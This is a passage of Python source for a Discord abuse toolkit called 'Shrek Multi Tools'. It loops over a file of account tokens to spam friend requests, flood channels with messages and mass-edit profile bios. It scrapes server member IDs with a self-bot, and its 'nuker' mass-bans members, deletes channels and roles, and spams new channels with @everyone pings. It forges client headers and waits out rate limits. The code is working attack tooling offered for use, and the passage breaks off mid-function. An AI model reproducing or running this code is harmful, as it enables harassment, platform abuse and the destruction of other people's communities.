  ▒ ░░▒░▒   ██▒▒▒ ▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░▒▒   ▓▒█ ▒▒▓  ▒ 
  ▒ ░▒░ ░ ▓██ ░▒░ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░ ░ ░   ▒▒  ░ ▒  ▒ 
  ░  ░░ ░ ▒ ▒ ░░  ░░           ░    ░░   ░ ░  ░  ░     ░   ░  ░░░ ░ ░   ░   ▒   ░ ░  ░ 
  ░  ░  ░ ░ ░              ░   ░     ░           ░      ░       ░           ░     ░    


    {Fore.WHITE}
{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}BRAVERY
{Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}BRILLIANCE
{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}BALANCE
{Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}] {Fore.WHITE}RANDOM
{Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}] {Fore.WHITE}LEAVE ALL HYPESQUADS

    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}"""))

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        if house == 1 or 2 or 3:
            payload = {
                'house_id':house
            }

            r = requests.post(url, headers=header, json=payload)
            if r.status_code == 200 or 204:
                print(f"{Fore.GREEN}    Done!")
            else:
                print(r)

        if house == 5:
            payload1 = {
                'house_id':'None'
            }

            t = requests.delete(url, headers=header, json=payload1)

        if house == 4:
            num = random.randint(1,3)

            payload2 = {
                'house_id':num
            }

            r = requests.post(url, headers=header, json=payload2)
            if r.status_code == 200 or 204:
                print(f"{Fore.GREEN}    Done!")
            else:
                print(r)

  def friends():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Friend Spammer")
    url = 'https://discord.com/api/v9/users/@me/relationships'

    print(f'''
    {Fore.GREEN}
  ▓█████ ██▀███  ▓█████  ██ ███▄    █  ▓█████▄       ██████  ██▓███   ▄▄▄       ███▄ ▄███▓  ███▄ ▄███▓▓█████ ██▀███  
 ▒██    ▓██ ▒ ██▒▓█   ▀▒▓██ ██ ▀█   █  ▒██▀ ██▌    ▒██    ▒ ▓██░  ██ ▒████▄    ▓██▒▀█▀ ██▒ ▓██▒▀█▀ ██▒▓█   ▀▓██ ▒ ██▒
 ▒████  ▓██ ░▄█ ▒▒███  ░▒██▓██  ▀█ ██▒ ░██   █▌    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░ ▓██    ▓██░▒███  ▓██ ░▄█ ▒
 ░▓█▒   ▒██▀▀█▄  ▒▓█  ▄ ░██▓██▒  ▐▌██▒▒░▓█▄   ▌      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  ▒██    ▒██ ▒▓█  ▄▒██▀▀█▄  
▒░▒█░   ░██▓ ▒██▒░▒████ ░██▒██░   ▓██░░░▒████▓     ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒▒██▒   ░██▒░▒████░██▓ ▒██▒
░ ▒ ░   ░ ▒▓ ░▒▓░░░ ▒░  ░▓ ░ ▒░   ▒ ▒ ░ ▒▒▓  ▒     ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░   ░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░       ░▒ ░ ▒░ ░ ░    ▒ ░ ░░   ░ ▒░  ░ ▒  ▒     ░ ░▒  ░  ░▒ ░       ░   ▒▒ ░░  ░      ░░░  ░      ░ ░ ░    ░▒ ░ ▒░
  ░ ░      ░   ░    ░    ▒    ░   ░ ░   ░ ░  ░     ░  ░  ░  ░░         ░   ▒   ░      ░    ░      ░      ░     ░   ░ 
░          ░        ░    ░          ░     ░              ░                 ░  ░       ░   ░       ░      ░     ░     


    ''')

    discordname = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the discord name + numbers?: ''')
    name,num = discordname.split('#')


    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        payload = {
            "username":name,
            'discriminator':num
        }
        r = requests.post(url, headers=header, json=payload)
        if r.status_code == 204 or 200:
            print(f'{Fore.GREEN}Done!')
        else:
            print(r)

  def tokenspammer():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Server Spammer")
      chanid = input(f'''
{Fore.GREEN}
 ██▀███   ▄▄▄       ██ ▓█████▄ ▓█████ ██▀███  
▓██ ▒ ██▒▒████▄   ▒▓██ ▒██▀ ██▌▓█   ▀▓██ ▒ ██▒
▓██ ░▄█ ▒▒██  ▀█▄ ░▒██ ░██   █▌▒███  ▓██ ░▄█ ▒
▒██▀▀█▄  ░██▄▄▄▄██ ░██▒░▓█▄   ▌▒▓█  ▄▒██▀▀█▄  
░██▓ ▒██▒ ▓█   ▓██ ░██░░▒████▓ ░▒████░██▓ ▒██▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█ ░▓ ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ░▒ ░ ▒░  ░   ▒▒   ▒   ░ ▒  ▒  ░ ░    ░▒ ░ ▒░
   ░   ░   ░   ▒    ▒   ░ ░  ░    ░     ░   ░ 
   ░           ░    ░     ░       ░     ░     


{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Channel ID: ''')
      message = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Message: ''')

      url = f'https://discord.com/api/v9/channels/{chanid}/messages'

      tokens = []
      token = []

      reversetoken = []
      with open('tokens.txt','r') as f:
          for line in f:
              tokens.append(line)

          for element in tokens:
              token.append(element.strip())

          length = len(token)

      for t in reversed(token):
        reversetoken.append(t)

      def spammer():
          for x in range(length):
              header = {
                  "authority": "discord.com",
                  "method": "POST",
                  "path": "/api/v9/users/@me",
                  "scheme": "https",
                  "accept": "*/*",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "en-US",
                  "Authorization": f"{token[x]}",
                  "content-length": "0",
                  "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                  "origin": "https://discord.com",
                  'referer': 'https://discord.com/channels/@me',
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "user-agent": useragent(),
                  "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                  "x-debug-options": "bugReporterEnabled",
                  "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              }

              r = requests.post(url, headers=header, json={'content':message})
              if r.status_code == 200 or 201:
                  print('Sent {}'.format(message))
              else:
                  print(r)

      def spammer2():
        for x in range(length):
          header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{reversetoken[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.post(url, headers=header, json={'content':message})
        if r.status_code == 200 or 201:
            print('Sent {}'.format(message))
        else:
            print(r)

      while __name__ == '__main__':
        spammer()
        spammer2()

  def biochanger():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Bio Changer")
    url = 'https://discord.com/api/v9/users/@me'

    abtoptions = input(f'''
    {Fore.GREEN}
  ▄▄▄▄     ██ ▒█████       ▄████▄   ██░ ██  ▄▄▄      ███▄    █    ▄████ ▓█████ ██▀███  
 ▓█████▄ ▒▓██▒██▒  ██▒    ▒██▀ ▀█ ▒▓██░ ██ ▒████▄    ██ ▀█   █ ▒ ██▒ ▀█▒▓█   ▀▓██ ▒ ██▒
 ▒██▒ ▄██░▒██▒██░  ██▒    ▒▓█    ▄░▒██▀▀██ ▒██  ▀█▄ ▓██  ▀█ ██▒░▒██░▄▄▄░▒███  ▓██ ░▄█ ▒
 ▒██░█▀   ░██▒██   ██░    ▒▓▓▄ ▄██ ░▓█ ░██ ░██▄▄▄▄██▓██▒  ▐▌██▒░░▓█  ██▓▒▓█  ▄▒██▀▀█▄  
▒░▓█  ▀█▓ ░██░ ████▓▒░    ▒ ▓███▀  ░▓█▒░██▓ ▓█   ▓██▒██░   ▓██░░▒▓███▀▒░░▒████░██▓ ▒██▒
░░▒▓███▀▒ ░▓ ░ ▒░▒░▒░     ░ ░▒ ▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒░   ▒ ▒  ░▒   ▒  ░░ ▒░ ░ ▒▓ ░▒▓░
░▒░▒   ░   ▒   ░ ▒ ▒░       ░  ▒    ▒ ░▒░ ░  ░   ▒▒ ░ ░░   ░ ▒░  ░   ░   ░ ░    ░▒ ░ ▒░
  ░    ░   ▒ ░ ░ ░ ▒      ░         ░  ░░ ░  ░   ▒     ░   ░ ░ ░ ░   ░ ░   ░     ░   ░ 
░ ░        ░     ░ ░      ░ ░       ░  ░  ░      ░           ░       ░     ░     ░     

    {Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}CUSTOM BIO
    {Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}RANDOM BIO
    {Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}Shrek BIO 

    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}''')

    if abtoptions in ['01','1']:
        bio1 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What do you want the token about me to say?: ''')
        payload1 = {
            'bio':bio1
        }

    elif abtoptions in ['02','2']:
        bio2 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the file with your about me's (Has to be in same directory): ''')
        bioss = []
        with open(bio2,'r', encoding='utf-8') as bio:
            for line in bio:
                bioss.append(line)
        realbio = random.choice(bioss)
        payload2 = {
            'bio':realbio
        }

    elif abtoptions in ['03','3']:
        bio3 = 'NUKED BY Shrek Multi Tool'
        payload3 = {
            'bio':bio3
        }

    else:
        print('Invalid Option')

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if abtoptions in ['01','1']:
            r = requests.patch(url, headers=header,json=payload1)
            if r.status_code == 200 or 204:
                print(' Done!')
            else:
                print(r)

        elif abtoptions in ['02','2']:
            t = requests.patch(url, headers=header,json=payload2)
            if t.status_code == 200 or 204:
                print(' Done!')
            else:
                print(t)

        elif abtoptions in ['03','3']:
            e = requests.patch(url, headers=header,json=payload3)
            if e.status_code == 200 or 204:
                print(' Done!')
            else:
                print(e)

        else:
          pass  

  def scraper():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | ID Scraper")
    print(f'''
{Fore.GREEN}
  ██████   ▄████▄  ██▀███   ▄▄▄      ██▓███   ▓█████ ██▀███  
▒██    ▒  ▒██▀ ▀█ ▓██ ▒ ██▒▒████▄   ▓██░  ██  ▓█   ▀▓██ ▒ ██▒
░ ▓██▄    ▒▓█    ▄▓██ ░▄█ ▒▒██  ▀█▄ ▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▒▓▓▄ ▄██▒██▀▀█▄  ░██▄▄▄▄██▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒ ▓███▀ ░██▓ ▒██▒▒▓█   ▓██▒██▒ ░  ░▒░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ░▒ ▒  ░ ▒▓ ░▒▓░░▒▒   ▓▒█▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░ ░   ░  ▒    ░▒ ░ ▒ ░ ░   ▒▒ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ 
░  ░  ░   ░         ░░   ░   ░   ▒  ░░           ░    ░░   ░ 
      ░   ░ ░        ░           ░           ░   ░     ░     

    ''')
    tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token you want to use to scrape?: ''')
    guildd = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the Server ID you want to scrape?: ''')
    chann = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Any channel id in the server: ''')
    bot = discum.Client(token=tukan)

    def closefetching(resp,guildid):
        if bot.gateway.finishedMemberFetching(guildid):
            lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
            print(str(lenmembersfetched))
            bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
            bot.gateway.close()

    def getmembers(guildid,channelid):
        bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
        bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
        bot.gateway.run()
        bot.gateway.resetSession()
        return bot.gateway.session.guild(guildid).members

    members = getmembers(guildd, chann)

    memberids = []

    for memberId in members:
        memberids.append(memberId)

    cls()

    with open('Member_id.txt','w') as ids:
        for element in memberids:
            ids.write(element + '\n')    

    print(f'Finished Scraping {len(memberids)} members ! Check Member_id.txt for the ids')

  def namegen():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Name Generator")
      print(f'''
      {Fore.GREEN}
 ███▄    █  ▄▄▄       ███▄ ▄███▓▓█████       ▄████ ▓█████ ███▄    █ 
 ██ ▀█▌  █ ▒████▄    ▓██▒▀█▀ ██▒▓█   ▀    ▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▓██  ▀█ ██▒▒██  ▀█▄  ▓██    ▓██░▒███      ░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
▓██▒  ▐███▒░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄    ░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
▒██░   ▓██░ ▓█   ▓██▒▒██▒   ░██▒░▒████    ░▒▓███▀▒░░▒████▒██░   ▓██░
░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░      ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░  ░   ▒▒ ░░  ░      ░ ░ ░        ░   ░   ░ ░  ░ ░░   ░ ▒░
   ░   ░ ░   ░   ▒   ░      ░      ░      ░ ░   ░ ░   ░     ░   ░ ░ 
         ░       ░  ░       ░      ░            ░     ░           ░ 

      ''')

      howmanynames = int(input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}How many names do you want? {Fore.GREEN}[{Fore.WHITE}less than 200{Fore.GREEN}]: '''))

      if howmanynames > 200:
          print('Maximum amount of names is 200!')
          return

      num1 = howmanynames / 2

      payload = {
          'count':num1
      }

      def getnames(urll):
          r = requests.get(urll, json=payload)

          data = r.json()['data']

          names = []

          for value in data:
              names.append(value['name'])

          with open('names.txt','a') as name:
              for line in names:
                  name.write(line + '\n')

      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/username-generator?count={num1}')
      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/gamertag-generator?count={num1}')

      print('Done! Added {} names to names.txt'.format(howmanynames))

  def nuker():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Server Nuker")
    print(f'''
{Fore.GREEN}
 ███▄    █  █    ██  ▀██ ▄█▀▓█████ ██▀███  
 ██ ▀█   █  ██  ▓██▒  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░ ▓███▄░ ▒███  ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▓▓█  ░██░ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
▒██░   ▓██░▒▒█████▓  ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▒░   ▒ ▒  ▒▓▒ ▒ ▒  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
░ ░░   ░ ▒░ ░▒░ ░ ░  ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
   ░   ░ ░   ░░ ░ ░  ░ ░░ ░    ░     ░   ░ 
         ░    ░      ░  ░      ░     ░     

    ''')
    token = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Account Token: ''')
    server = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Server ID: ''')
    chann = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Any Channel ID: ''')


    intents = discord.Intents.all()
    intents.members = True

    headerrs = {'Authorization': f'{token}',
                "accept": "*/*",
                'origin': 'https://discord.com',
                'sec - fetch - mode': 'cors',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                'sec - fetch - site': 'same - origin',
                'x - debug - options': 'bugReporterEnabled',
                'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                }
    client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

    def BanAll():
        with open('data/Member_id.txt') as memberss:
            for line in memberss:
                r = requests.put(f'https://discord.com/api/v9/guilds/{server}/bans/{line}', headers=headerrs)
                if r.status_code == 200 or 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banned {line} ")
                else:
                    print(f'{Fore.MAGENTA}[-]{Fore.RESET} You cant ban members') 
    class UNuker:
        def DeleteChannels(self, guild, channel):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Channel {channel}")
                        break
                    else:
                        break

        def DeleteRoles(self, guild, role):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                    headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTGREEN_EX}[-] {Fore.RESET}Deleted Role {role}")
                        break
                    else:
                        break

        async def Scrape(self):
            await client.wait_until_ready()
            guildOBJ = client.get_guild(int(server))

            channelcount = 0
            with open('data/channels.txt', 'w') as c:
                for channel in guildOBJ.channels:
                    c.write(str(channel.id) + "\n")
                    channelcount += 1
                c.close()

            bot = discum.Client(token=token)

            def closefetching(resp,guildid):
                if bot.gateway.finishedMemberFetching(guildid):
                    lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                    print(str(lenmembersfetched))
                    bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                    bot.gateway.close()

            def getmembers(guildid,channelid):
                bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guildid).members

            members = getmembers(server, chann)

            global memberids
            memberids = []

            for memberId in members:
                memberids.append(memberId)

            with open('data/Member_id.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')  

            rolecount = 0
            with open('data/roles.txt', 'w') as r:
                for role in guildOBJ.roles:
                    r.write(str(role.id) + "\n")
                    rolecount += 1
                r.close()


        def SpamChannels(self, guild, name):
            while True:
                json = {'name': name, 'type': 0}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs, json=json)

                id = r.json()["id"]

                def sendmessage():
                    e = requests.post(f'https://discord.com/api/v9/channels/{id}/messages',headers=headerrs, json={'content':'@everyone @here NUKED BY Shrek'})
                    if 'retry_after' in e.text:
                        ratelimittime = round(e.json()["retry_after"])
                        time.sleep(ratelimittime)

                sendmessage()

                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
                        break
                    else:
                        print(f'{Fore.MAGENTA}[-]{Fore.RESET} You cant create channels')



        def SpamRoles(self, guild, name):
            while True:
                json = {'name': name}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                    json=json)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
                        break
                    else:
                        print(f'{Fore.MAGENTA}[-]{Fore.RESET} You cant create roles')
                        break

        async def NukeStart(self):
            cls()
            chh = 'nuked-by-shrek-multi-tools'
            cha = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Channel Amount: ''')
            rn = 'NUKED BY Shrek-Multi-Tools'
